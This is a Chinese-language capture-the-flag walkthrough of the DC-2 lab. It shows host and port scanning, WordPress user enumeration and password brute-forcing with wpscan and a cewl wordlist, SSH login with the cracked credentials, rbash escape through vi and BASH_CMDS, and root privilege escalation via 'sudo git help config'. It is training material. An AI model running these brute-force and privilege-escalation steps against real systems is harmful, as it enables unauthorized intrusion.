## DC-2

### 1.信息搜集

#### 探测目标主机IP地址

```
arp-scan l
```

![image-20221004202234040](https://luminary74-1312852271.cos.ap-beijing.myqcloud.com/202210042022295.png)

#### 全面检测目标IP

```
nmap -A -p- 192.168.119.135
```

![image-20221004202527641](https://luminary74-1312852271.cos.ap-beijing.myqcloud.com/202210042025940.png)

开放了80端口的http协议和7744端口的ssh服务

未遵循重定向到http://dc-2/

修改本地DNS文件，打开/etc/hosts文件，添加本地DNS

![image-20221004203139143](https://luminary74-1312852271.cos.ap-beijing.myqcloud.com/202210042031293.png)

#### 网页信息探测

打开浏览器访问``192.168.119.135``或``http://dc-2/``

![image-20221004204243121](https://luminary74-1312852271.cos.ap-beijing.myqcloud.com/202210042042371.png)

页面底部就有flag选项，找到flag1

![image-20221004204429588](https://luminary74-1312852271.cos.ap-beijing.myqcloud.com/202210042044656.png)

``Flag 1:Your usual wordlists probably won’t work, so instead, maybe you just need to be cewl.More passwords is always better, but sometimes you just can’t win them all.Log in as one to see the next flag.If you can’t find it, log in as another.``

``你通常使用的单词表可能行不通，所以，也许你只需要安静一下。更多的密码总是更好的，但有时你无法赢得所有密码。以个人身份登录以查看下一个标志。如果找不到，请以另一个身份登录。``

这里提示我们使用``cewl工具``生成字典

#### 目标扫描

利用工具``dirsearch``扫描一下网站目录

```
dirsearch -u http://dc-2/ -e * -x 403 404
```

![image-20221004205142517](https://luminary74-1312852271.cos.ap-beijing.myqcloud.com/202210042051964.png)

``-u 网站地址``

``-e 语言，可选php，asp等，*表示全部``

``-x 表示过滤的状态码，扫描出来后不显示该状态``

扫出来一个登入界面，访问``http://dc-2/wp-login.php``

![image-20221004205530568](https://luminary74-1312852271.cos.ap-beijing.myqcloud.com/202210042055613.png)

登录到后台，接下来爆破账号密码

### 2.Web端渗透

#### 字典生成

flag1 提示到，一般的字典派不上用场，需要用到cewl工具爬取目标网站信息，生成相对应字典

```
cewl http://dc-2/ -w /home/kali dict.txt
```

![image-20221004210117584](https://luminary74-1312852271.cos.ap-beijing.myqcloud.com/202210042101652.png)

#### 用户名枚举爆破

使用``WPScan``工具，一款针对WordPress CMS的工具

```
wpscan --url dc-2 -e u
```

![image-20221004210516880](../../AppData/Roaming/Typora/typora-user-images/image-20221004210516880.png)

扫描出三个用户名，创建一个``username.txt``文件

```
admin
jerry
tom
```

#### 密码枚举爆破

使用工具``wpscan``，用户名字典选择``username``，字典选择``cewl``生成的字典``dict.txt``

```
wpscan --url dc-2 -U /home/kali/Desktop/username.txt -P /home/kali/Desktop/dict.txt
```

![image-20221004211253931](https://luminary74-1312852271.cos.ap-beijing.myqcloud.com/202210042112044.png)

爆破出jerry和tom密码

```
 | Username: jerry, Password: adipiscing
 | Username: tom, Password: parturient
```

登录jerry用户，得到flag2

![image-20221004211536844](https://luminary74-1312852271.cos.ap-beijing.myqcloud.com/202210042115923.png)

``Flag 2:If you can't exploit WordPress and take a shortcut, there is another way.Hope you found another entry point.``

``如果你不能利用WordPress并使用快捷方式，还有另一种方法。希望您找到另一个入口点。``

提示了我们不能直接通过cms漏洞拿到shell了，让我们找另一种方法

### 3.主机端渗透

#### ssh协议远程登录

```
ssh 用户名@主机地址 -p 端口
ssh jerry@192.168.119.135 -p 7744
```

输入密码错误

换tom试试

```
ssh tom@192.168.119.135 -p 7744
parturient
```

登录成功！

![image-20221004212228970](https://luminary74-1312852271.cos.ap-beijing.myqcloud.com/202210042122090.png)

rbash限制，权限低

#### rbash逃逸

具体可参考[rbash逃逸方法总结](https://blog.csdn.net/qq_43168364/article/details/111830233)

rbash限制后能进行的操作

```
echo $PATH
#查看上面得到path路径的所有文件
#运行结果 /home/tom/usr/bin
echo /home/tom/usr/bin/*
```

![image-20221004212628490](https://luminary74-1312852271.cos.ap-beijing.myqcloud.com/202210042126685.png)

可以看见能用这四个命令，唯一有用的就只有vi（编辑器）这个命令，这里可以里用vi或者是BASH_CMDS设置shell来绕过rbash，然后再设置环境变量添加命令

##### 方法一：vi设置shell

先进入vi编辑器界面：``vi``

然后按Esc键，输入：``:set shell=/bin/bash``

设置好shell并回车，接着输入： ``:shell``

回车，启动shell

![image-20221004213650216](https://luminary74-1312852271.cos.ap-beijing.myqcloud.com/202210042136265.png)

一开始没设置成功``No write since last change``

后面按步骤设置好了

![image-20221004213825796](https://luminary74-1312852271.cos.ap-beijing.myqcloud.com/202210042139353.png)

已经升级为bash，无法执行cat命令是因为环境变量的问题，用以下命令添加路径即可

```
export PATH=$PATH:/bin/
 
export PATH=$PATH:/usr/bin/
```

<img src="https://luminary74-1312852271.cos.ap-beijing.myqcloud.com/202210042140070.png" alt="image-20221004214002997" style="zoom:100%;" />

拿到flag3

``Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.``

``可怜的老汤姆总是在追杰瑞。也许他应该承受他造成的所有压力。``

##### 方法二：BASH_CMDS设置shell

设置shell并执行

```
BASH_CMDS[x]=/bin/bash
#设置了个x变量shell
 
x
#相当于执行shell
```

![image-20221004214931216](https://luminary74-1312852271.cos.ap-beijing.myqcloud.com/202210042149267.png)



flag3提示我们，切换到jerry用户

#### su切换用户

```
su jerry
adipiscing
```

![image-20221004215432519](https://luminary74-1312852271.cos.ap-beijing.myqcloud.com/202210042154575.png)

find命令查找flag(正则表达式)

```
find / -name *flag*
```

![image-20221004215601527](https://luminary74-1312852271.cos.ap-beijing.myqcloud.com/202210042156757.png)

除了flag4，其他权限都没有，查看flag4

![image-20221004215710624](https://luminary74-1312852271.cos.ap-beijing.myqcloud.com/202210042157723.png)

``Good to see that you've made it this far - but you're not home yet. You still need to get the final flag (the only flag that really counts!!!).  No hints here - you're on your own now.  :-)Go on - git outta here!!!!``

``很高兴看到你已经走了这么远，但你还没有回家。你还需要得到最后的旗子（唯一真正重要的旗子！！！）。这里没有提示-您现在可以自己了。：-）走吧，快离开这里！！！！``

提示我们git，root 提权

### 4.Git提权

查看具有SUID权限的二进制文件

```
find / -user root -perm -4000 -print 2>/dev/null
```

![image-20221004220026654](https://luminary74-1312852271.cos.ap-beijing.myqcloud.com/202210042200800.png)

[简谈SUID提权](https://www.freebuf.com/articles/web/272617.html)

没有可以利用的文件，只能尝试git

```
sudo -l
```

![image-20221004220232309](https://luminary74-1312852271.cos.ap-beijing.myqcloud.com/202210042202305.png)

发现git能使用root权限，以下有两种提权方式

**第一种**

```
sudo git help config
```

命令模式输入（这里用的是finalshell的命令行输入）

```
!/bin/bash  (这里bash也可以换成sh)
```

**第二种**

```
sudo git -p help
```

命令模式输入

```
!/bin/bash  (这里bash也可以换成sh)
```

提权成功，获得root权限，切换到root目录下

查看flag5（final-flag.txt）

![image-20221004221912639](https://luminary74-1312852271.cos.ap-beijing.myqcloud.com/202210042219855.png)